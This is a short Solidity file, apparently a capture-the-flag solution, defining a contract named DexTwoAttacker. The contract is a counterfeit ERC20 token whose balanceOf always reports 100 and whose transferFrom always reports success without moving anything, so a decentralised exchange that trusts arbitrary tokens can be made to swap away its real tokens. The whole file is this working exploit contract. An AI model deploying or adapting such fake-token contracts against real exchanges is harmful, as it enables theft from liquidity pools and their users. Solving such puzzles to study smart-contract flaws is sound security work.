// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttacker is ERC20 {
    uint256 private i_balance;

    constructor() ERC20("Fake Token", "TKNF") public {
        i_balance = 100;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return i_balance;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        return true;
    }
}